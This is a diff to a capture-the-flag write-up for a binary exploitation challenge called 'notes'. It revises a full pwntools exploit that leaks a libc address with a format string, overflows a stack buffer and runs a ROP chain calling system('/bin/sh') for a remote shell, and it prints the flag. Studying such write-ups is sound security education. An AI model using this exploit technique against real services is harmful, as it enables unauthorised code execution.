@@ -88,16 +88,7 @@ But why we need them?
 
 In short, **POP_RDI** is used to load the address of "/bin/sh" into rdi, and **RET** is used for alignment or adjusting the stack before calling `system()` with the appropriate arguments.
 
-Finding **POP_RDI** and **RET**:
-```bash
-ROPgadget --binary libc.so.6 > gadget.txt
-```
-
-Search for `ret` and `pop rdi` in `gadget.txt`:
-
-![Screenshot](/static/writeups/airange24/pwn/notes10.png)
-
-![Screenshot](/static/writeups/airange24/pwn/notes11.png)
+So, to find **POP_RDI** and **RET**, I will use rop gadget (`rop.find_gadget()`).
 
 Final payload that I created:
 
@@ -107,24 +98,19 @@ from pwn import *
 
 context.terminal = ["tmux", "splitw", "-h"]
 
-# Helper functions
-encode = lambda e: e if type(e) == bytes else str(e).encode()  # Lambda function to encode strings to bytes
-hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)     # Lambda function to convert hex string to integer
+encode = lambda e: e if type(e) == bytes else str(e).encode()       # Lambda function to encode strings to bytes
+hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)         # Lambda function to convert hex string to integer
 
-# Set up executable file and ELF context
-exe = "./notes"            # Path to the executable
-elf = context.binary = ELF(exe)  # Load the ELF binary
-libc = elf.libc            # Get the libc
+exe = "./notes"
+elf = context.binary = ELF(exe)
+libc = elf.libc
 
 # Set up the connection (remote or local)
 io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
-
 # If GDB flag is enabled, attach to the process for debugging
-if args.GDB:
-    gdb.attach(io, "b *main")
+if args.GDB: gdb.attach(io, "b *main")
 
-# ROP gadget setup
-rop = ROP(elf)
+rop = ROP(libc)
 
 io.sendlineafter(b"$ ", b"1")
 io.sendlineafter(b"note: ", b"|%27$p|")
@@ -132,42 +118,39 @@ io.sendlineafter(b"$ ", b"2")
 io.sendlineafter(b": ", b"0")
 
 # Receiving leaked address and parsing it
-leak = int(io.recvline().split(b"|")[1], 16)   # Receive the leaked address and convert it to integer
-print("leak @ %#x" % leak)                    # Print the leaked address
+leak = int(io.recvline().split(b"|")[1], 16)
+print("leak @ %#x" % leak)
 
+# Calculating the libc base address using the leaked address
+libc.address = leak - 0x29d90
+print("base @ %#x" % libc.address)
 
-libc.address = leak - 0x29d90   # Calculating the libc base address based on the leaked address
-print("base @ %#x" % libc.address)  # Printing the calculated libc base address
-
-# ROP gadget addresses
-POP_RDI = libc.address + 0x000000000002a3e5   # Address of POP RDI gadget
-RET = libc.address + 0x0000000000029139        # Address of return address
+# Finding the gadgets needed for ROP chain
+POP_RDI = libc.address + rop.find_gadget(['pop rdi', 'ret'])[0]
+RET = libc.address + rop.find_gadget(['ret'])[0]
 
 payload = flat(
-    cyclic(276),                             # Fill buffer with cyclic pattern (overflow to RIP)
-    POP_RDI,                                 # Setting up RDI register for system call
-    next(libc.search(b"/bin/sh\x00")),      # Address of "/bin/sh" string in libc
-    RET,                                     # Return address
-    libc.sym.system                         # Address of system() function in libc
+    cyclic(276),                        # Filling buffer with cyclic pattern (overflow to RIP)
+    POP_RDI,                            # Setting up RDI register for system call
+    next(libc.search(b"/bin/sh\x00")),  # Address of "/bin/sh" string in libc
+    RET,                                # Return address
+    libc.sym.system                     # Calling system() function
 )
 
 io.sendline(b"0")
 io.recvuntil(b'$ ')
 io.sendline(b"1")
 
-# Sending payload
 io.sendline(payload)
 io.interactive()
 ```
 
 Running it against remote:
 
-![Screenshot](/static/writeups/airange24/pwn/notes12.png)
+![Screenshot](/static/writeups/airange24/pwn/notes10.png)
 
 ### Flag:
 
 ```
 AUCSS{1_th0ught_cpp_w4s_s3cur3}
 ```
-
-I tried to find POP_RDI and RET using `rop.find_gadget()` but I'm not sure why it wasn't working. It might have been a syntax issue on my part. So, I did it manually.
